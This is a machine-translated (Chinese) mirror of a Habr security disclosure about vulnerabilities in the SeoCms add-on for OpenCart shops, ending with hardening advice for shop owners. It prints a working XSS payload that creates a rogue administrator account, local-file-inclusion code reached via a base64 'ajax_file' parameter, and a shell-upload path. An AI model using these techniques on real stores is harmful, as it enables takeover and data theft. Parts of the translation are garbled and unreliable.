<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🤘🏼 🧑🏿‍🤝‍🧑🏽 👨🏽‍🎨 Opencartforum和朋友 ⚡️ 👨🏼‍🍳 🏴󠁧󠁢󠁥󠁮󠁧󠁿</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="所有的狗都会上天堂，Opencart上的网上商店的所有人或迟或早都会在Opencartforum上。 当首次在主机上安装引擎后的欣喜之情过去了，残酷的现实开始了，典型的商店老板总是开始错过某些东西，并且他开始了为自己的商店寻找合格承包商和优质附件的艰难道路。 

 您可以在Runet上找到这两者的最...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Opencartforum和朋友</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/466283/"><img src="https://habrastorage.org/webt/i_/fm/jp/i_fmjpfeqs4zmi1axxwqrczafv0.jpeg" alt="图片"><br><br> 所有的狗都会上天堂，Opencart上的网上商店的所有人或迟或早都会在Opencartforum上。 当首次在主机上安装引擎后的欣喜之情过去了，残酷的现实开始了，典型的商店老板总是开始错过某些东西，并且他开始了为自己的商店寻找合格承包商和优质附件的艰难道路。 <br><br> 您可以在Runet上找到这两者的最大资源，这是opencartforum.com，该网站如今拥有超过14万注册用户。 在这14万个注册中，甚至有一半是居住在现场商店中的人，他们使用可以在网站上立即购买的模板或模块。 所有这些人甚至都没有意识到，与这些附件一起，他们获得了许多母亲的黑客只能梦wonderful以求的出色后门和漏洞。 <br><a name="habracut"></a><br> 尽管在论坛商店中发布附加组件的规则中以声明性形式出现，但它是用黑色和白色编写的。 我们有qadepartment，受过专门训练的人员检查加载项是否存在漏洞。 <br><br> 事实证明，作为在插件作者和最终用户之间进行调解的平台，论坛，或者插件作者都没有承担任何责任。 <br> 怎么会这样 等等！ 从历史上看。 <br><br> 为我自己模拟事件的假设后果，将在后面讨论，我头上的头发直立。 <br><br> 试想一下。 您是一家成功的商店老板，已经有几年没晚上睡觉了，写了一些文字，对黑，白，灰色seo eo之以鼻，与大熊猫战斗，米努辛斯克，还没喝完酒，吸引了100,000位顾客，投入了头寸。 您的孩子上一所好的幼儿园，然后突然您的销售额下降了一半，这仅仅是因为您与所有联系客户的基数都流向了竞争对手。 或突然之间，您完全迷失了它，因为一个月来，您的商店一直在使用其他人的mysql服务器工作，您甚至没有注意到kofig的变化，并且主机上的所有备份都变坏了。 <br><br> 他们在类似的情况下表现出自己的感觉，工作了几年，一天之内就筋疲力尽了。 你说，事实并非如此。 <br><br> 但这很容易。 只需购买带有未声明的未公开保护“保护”以防止未经授权使用的附件，您的数据很快就会变得陌生！ <br><br><h2> 第一次事件 </h2><br> 六个月前，当Ai-Bol扫描仪报告针对<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SeoCms</a>模块中的奇怪代码（超过10,000个活动安装）发出奇怪警告时，从表面上阻止了一家商店。 <br><br> 我们开始仔细观察，结果发现这个abracadabra只是简单地显示了附加组件的版本： <br><br><pre><code class="php hljs">$text_redaeh_stpo = $text_redaeh_stpo_1.$value_tnega.$text_redaeh_stpo_2.$text_redaeh_stpo_3.$text_reda eh_stpo_4.$text_redaeh_stpo_5.$text_redaeh_stpo_6.$text_redaeh_stpo_7.$text_redaeh _stpo_8.$text_redaeh_stpo_9.$value_revres.$text_redaeh_stpo_10; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($date_diff &gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) { $ver_content = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $opts = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( $text_ptth =&gt; <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_dohtem =&gt;$text_tsop, $redaeh =&gt;$text_redaeh_stpo, $tnetnoc =&gt; $yreuq_dliub_ptth(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_rdda =&gt;$value_rdda, $text_liame =&gt; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'liame'</span></span>], $text_rev=&gt;<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'blog_version'</span></span>] )))); $context = $etaerc_txetnoc_maerts($opts); $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ver_content = $stnetnoc_teg_elif($rev_knil, <span class="hljs-keyword"><span class="hljs-keyword">FALSE</span></span> , $context); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { <span class="hljs-comment"><span class="hljs-comment">//echo "Warning or better raised: " . $e-&gt;getMessage(); } $this-&gt;model_setting_setting-&gt;editSetting('blog_ver', Array('blog_version_date' =&gt; $date_current, 'blog_version_content' =&gt; $ver_content )); } if ($this-&gt;data['blog_version']!=$ver_content) { $this-&gt;data['text_new_version'] = $this-&gt;language-&gt;get('text_new_version').$ver_content. " &lt;span style='color: #000; font-weight: normal;'&gt;(".$date_ver_update.")&lt;/span&gt;". $this-&gt;language-&gt;get('text_new_version_end'); } else { $this-&gt;data['text_new_version'] = ''; }</span></span></code> </pre> <br> 没关系，除了： <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;language-&gt;get(<span class="hljs-string"><span class="hljs-string">'text_new_version'</span></span>).$ver_content. <span class="hljs-string"><span class="hljs-string">" &lt;span style='color: #000; font-weight: normal;'&gt;("</span></span>.$date_ver_update.<span class="hljs-string"><span class="hljs-string">")&lt;/span&gt;"</span></span></code> </pre><br> 它不会以任何方式进行过滤，并且如果偶然输入了以下脚本（而不是客户端版本），那么对安装模块的任何商店的管理员访问权限都是时间和技术问题。 <br><br><pre> <code class="php hljs">&lt;script&gt; <span class="hljs-comment"><span class="hljs-comment">// shell sample // seocms the best architectural mistake forever // i got all your 10 000 shops // i install 10 000 backdors function​ getUrlVars​()​ {​ v​ar​vars=​​[​],​hash,​​hashes=​​n​ull;​ i​f​​(w​indow​.l​ocation.​h​ref​.i​ndexOf(​"​?"​)​​&amp;&amp; window​.​location.​h​ref.​​indexOf​("​&amp;")​)​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.l​ocation​.h​ref​.i​ndexOf​(​"?"​)​​+ 1)​.​split(​​"&amp;"​); }​​​else​i​f​​(w​indow​.l​ocation.​h​ref​.​indexOf(​​"?"​))​​{ hashes =​ window​.​location.​h​ref.​​slice​(w​indow​.​location​.h​ref​.i​ndexOf​(​"?"​)​​+​​1​); }​ i​f​ ​(h​ashes!​=​n​ull)​ ​{​ f​or​​(v​ar​i​=​​0;​​i​&lt;​hashes​.​length​;​i​++)​{​ hash=​​hashes[​​i]​.s​plit​(​"=")​; vars[​h​ash​[0​]​]​​=​hash​[​1]​; }​ }​ r​eturn​vars;​ } var​ url_vars =​ ​ getUrlVars​(); var​ token =​ ​ url_vars.​ ​token​; var​ host ​=​ window.​ ​location​.​origin;​ var​action=​​host+​​"​/admin/index.php?route=user/user/add&amp;token="​+​ token;​ document.​ ​addEventListener​(​"DOMContentLoaded"​,​ ​function​(​event​)​ ​{ $​.p​ost(​​action,​​{​​username​:​​"Hack123"​,​user_group_id​:​​"1"​, firstname​:​"​Lol",​​lastname​:​"​Haha"​,​ email​:​​"Hack123@Hack123.com"​, password:​​"​1234",​​ confirm​:​​"1234"​,​ status​:​​"1"​​}​​); }); &lt;/script&gt;</span></span></code> </pre><br> 有关情况的详细信息，请参见<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">此处</a> 。 行政通知<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在这里</a> 。 <br><br> 大概是第五次，已经为论坛管理部门非常清楚地建模了此过程，因此有可能传达情况的严重性。 <br><br> 反过来，主管部门又正式通知用户此漏洞的存在，而且它似乎甚至向客户发布了新闻通讯。 但这是不准确的。 <br><br> 让我们将附加组件的作者的威胁和逃避抛诸脑后，再继续两个月... <br><br><h2> 第二次事件 </h2><br> 另一家商店来检查，其中每页上都有长达3-4秒的野fr。 我们开始剖析并在文件夹中看到20k +扩展名为.php的文件的缓存。 用php扩展名Karl缓存文件，这绝非偶然！ <br><br> 我们调查这些文件的数据结构，然后再看一下我们漂亮的SEOCMS模块的各个部分。 <br><br> 还有一个很棒的方法： <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $ajax_file = DIR_CACHE.base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">"ajax_file"</span></span>])); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; }</code> </pre> <br> 这是经典漏洞-本地文件包含的示例。 <br><br> 在base64 ../....../config.php和hello中进行编码就足够了-require（$ ajax_file）; 并请：这里您有数据库的密码，这里是系统错误日志，即使/ etc / pwd一直很重要，即使/ etc / pwd也是非常必要的，那该怎么办？ <br><br>  phpmyadmin领域中有多少个默认设置的主机和服务器？ 一半吗 还有吗 <br><br> 我们开始进一步寻找，发现了什么？ 精彩头像下载代码： <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!$json) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (is_uploaded_file(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>]) &amp;&amp; file_exists(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>])) { $file = basename($filename) . <span class="hljs-string"><span class="hljs-string">'.'</span></span> . md5(substr(sha1(uniqid(mt_rand(), <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>)); $file_original = basename($filename); <span class="hljs-comment"><span class="hljs-comment">// Hide the uploaded file name so people can not link to it directly. //$json['file'] = $this-&gt;encryption-&gt;encrypt($file); // To remove highload from the file system, when large number of buyers $avatar_dir = 'data/avatars/'.(ceil ($this-&gt;data['customer_id'] / 300)) * 300; move_uploaded_file($this-&gt;request-&gt;files['file']['tmp_name'], DIR_IMAGE . $file); $new_filename = $avatar_dir.'/'.$this-&gt;data['customer_id']."_".utf8_strtolower($file_original); if (isset($this-&gt;data['thislist']['avatar_width']) &amp;&amp; $this-&gt;data['thislist']['avatar_width']!='') { $width = $this-&gt;data['thislist']['avatar_width']; } else { if (isset($this-&gt;data['generallist']['avatar_width']) &amp;&amp; $this-&gt;data['generallist']['avatar_width']!='') { $width = $this-&gt;data['generallist']['avatar_width']; } else { $width = '100'; } } if (isset($this-&gt;data['thislist']['avatar_height']) &amp;&amp; $this-&gt;data['thislist']['avatar_height']!='') { $height = $this-&gt;data['thislist']['avatar_height']; } else { if (isset($this-&gt;data['generallist']['avatar_height']) &amp;&amp; $this-&gt;data['generallist']['avatar_height']!='') { $height = $this-&gt;data['generallist']['avatar_height']; } else { $height = '100'; } } $this-&gt;load-&gt;model('tool/image'); $json['file'] = $avatar_thumb = $this-&gt;model_tool_image-&gt;resizeavatar($file, $new_filename , $width, $height, true, false); if (trim($avatar_thumb)=='') { $json['error'] = $this-&gt;language-&gt;get('error_upload'); } if ($file!='' &amp;&amp; file_exists(DIR_IMAGE . $file)) { unlink (DIR_IMAGE . $file); } } }</span></span></code> </pre> <br> 在加载某种shell.php.png之后，尝试调整大小（并向我们显示下载文件的完整路径）时，它完全会出错，然后也可以由先前的方法完美执行。 <br><br> 漏洞利用视频（打开php系统错误输出）： <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/SdyW8OzAfZI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br> 漏洞利用视频（关闭php系统错误输出）： <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/f-JYKzT_WAk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br> 代码分析于2019年4月在模块52的版本上进行。 <br><br> 由于论坛的作者和管理者是在相同的日期被通知的，因此他们有足够的时间采取所有可能的措施，以通知购买者该漏洞已消除，因此，我们很清楚地可以披露所有详细信息。 <br><br> 在那一刻，发生了一些事情。 在开发人员的服务器上是他自己的模块。 但是该漏洞无法解决。 她被掩盖了……这是一个很大的奇怪。 很大！ <br><br> 整个故事的第二个奇怪之处是，主管部门和附加组件质量控制部门的opencartforum既没有看到第一个事件，也没有看到第二个事件，并且在这两种情况下，第一次通知都没有发现任何关键事件。 <br><br> 当然，当您的配置大放异彩时，没有什么关键的。 当有一半的店主不知道他们的内幕正在发生什么时，没有什么紧要的。 毕竟，他们曾经有人将这个附加组件放进去，而且没有邮寄，他们甚至没有意识到整个业务都受到直接威胁。 <br><br> 如果主管部门对第一个事件有不同的反应，则在第二个事件中，所有提及该事件的帖子都将被删除。 所有这些都包含在<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">论坛报价中</a> ，根据该<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">报价</a> ，关于商业增值，可以留下关于死者的评论，不管是好是无。 <br><br> 作者还声称错误和漏洞是固定的，qadepartment错过了要出售的附件，但不，漏洞没有固定... <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!class_exists(<span class="hljs-string"><span class="hljs-string">'PHP_Exceptionizer'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">'modification'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(modification(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>); } } $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $filename = preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9\.\-\s+]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, html_entity_decode(base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">'ajax_file'</span></span>])), ENT_QUOTES, <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>)); $ajax_file = DIR_CACHE . $filename; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ob_start(); <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>($ajax_file); $ajax_html = ob_get_contents(); ob_end_clean(); header(<span class="hljs-string"><span class="hljs-string">'Content-type: text/html; charset=utf-8'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $ajax_html; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;deletecache(<span class="hljs-string"><span class="hljs-string">'cache.ajax'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { } }</code> </pre> <br>  require（）仍然在这里。 输入经过轻微过滤。 但是潜在的LFI既有生命也有生命。 如果再多一点，那么是的，现在我们既不能加载也不能执行Shell。 但是，假设我们尝试关闭，巩固了除index.php以外的所有脚本的执行，甚至在nginx配置级别也无法执行。 但是在其他地方，邪恶的黑客有机会将任意文件放入缓存文件夹。 会发生什么？ 没错-执行多余的代码，在get请求中生成哈希，这需要两分钟。 就是说，最终，它是封闭的，但不是完全封闭的。 <br><br> 好了，这些小事情：语言文件中如何体现出如此华丽的关系： <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span> || $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>] == <span class="hljs-string"><span class="hljs-string">'1'</span></span>)) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'https'</span></span>) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) &amp;&amp; strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span>))) { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTPS_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTPS_CATALOG; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTP_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTP_CATALOG; }</code> </pre> <br> 它们会发光……您想知道到项目根目录的完整路径。 只需找到打开了错误显示的商店，然后直接运行指向语言文件的链接即可。 <br><br> 要研究在以作者的兆行代码为单位的百万字节更新插件之后可能还会发生的事情-既没有资源也没有需求。 为此，有经过专门培训的负责人。 <br><br> 还有蛋糕上的樱桃。 我们记得，我们有一个商业附加组件...在一个商业附加组件中，作者的资源中隐藏了文字： <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">www.google.com/search?q=%22技术支持+ by + SEO + CMS％22</a> </blockquote><br> 有趣的是，至少有一个附加购买者知道这种“奇妙”的复活节彩蛋吗？ <br><br> 今天，补品既出售又出售。 只需致电以关注情况的帖子即可删除。 没有买家收到有关第二起事件的警告通知。 也许有20-30％的加载项用户已更新，但是70％-即使我们谈论的是官方作者关于加载项使用情况的统计信息，这些商店也有7000家（实际上，更多）-因为没人知道自由职业者在客户端商店安装了多少副本扩展许可）处于巨大的风险区域。 <br><br> 用蒙克豪森男爵的话来说，我只想说一件事：先生们更新了！ <br><br><h2> 对于客户 </h2><br> 该怎么办，那些最终沉没在这艘潜艇中的人： <br><br><ul><li> 不要在ftp上留下垃圾。 查看info.php，adminer.php和所有其他垃圾。 您应该只有index.php和一个点。 </li><li> 定期更改密码，所有密码（ftp，管理面板，数据库）。 并确保您不会意外拥有多余的陌生帐户。 </li><li> 禁用错误输出。 始终，如果您不工作，请在解释器配置级别而不是在商店设置中关闭错误输出。 </li><li> 是的，我知道这不是很可行，但是您至少应该保持与安全性相关的引擎代码更新，并在理想情况下定期将引擎更新为稳定版本。 </li><li> 定期查看访问日志，可能会有很多有趣的事情。 跟踪异常。 </li><li> 另外，使用密码或商店的ip admin限制以及各种易受攻击的部分（例如phpmyadmin）限制关闭。 如果这是所有人共享phpmyadmin的共享，请远离此类托管！ </li><li> 如果使用sxd和类似的实用程序，请立即将它们重命名为随机字符集。 </li><li> 使用nginx时，值得在虚拟主机配置中添加规则，以禁止运行网站的root和admin部分中除index.php以外的任何php脚本。 </li><li> 不要从您的帐户扔垃圾。 如果您有一家商店，那就让它成为一家商店。 不要在一个帐户下加载一堆wp博客，一堆bug和各种测试域。 </li><li> 切勿将网站或数据库的备份存储在虚拟主机的根目录中。 </li><li> 观察服务器/主机上的负载，尝试使高峰负载的电源至少保持x2，如果负载突然由于无缘无故突然增加，请尝试找出原因。 最好不要超车！ </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN466283/">https://habr.com/ru/post/zh-CN466283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN466263/index.html">基准RPC系统（和Inverted Json）</a></li>
<li><a href="../zh-CN466267/index.html">为什么许多人低估了他们的比赛</a></li>
<li><a href="../zh-CN466271/index.html">IB组和Belkasoft联合课程：我们教什么以及谁来</a></li>
<li><a href="../zh-CN466279/index.html">大多数Android设备易受SMS的网络钓鱼攻击</a></li>
<li><a href="../zh-CN466281/index.html">虚拟现实，开源游戏和电动汽车：约翰·卡马克（John Carmack）在播客乔·罗根（Joe Rogan）中说的话</a></li>
<li><a href="../zh-CN466285/index.html">一个免费赠品：抽奖二合一dvr和雷达探测器</a></li>
<li><a href="../zh-CN466287/index.html">2019年全国互联网细分市场可靠性研究与报告</a></li>
<li><a href="../zh-CN466289/index.html">立法举措。 奇怪，但被介绍给国家杜马</a></li>
<li><a href="../zh-CN466291/index.html">2019年全国互联网细分市场的可持续性调查</a></li>
<li><a href="../zh-CN466295/index.html">Scala上的无痛回退缓存</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>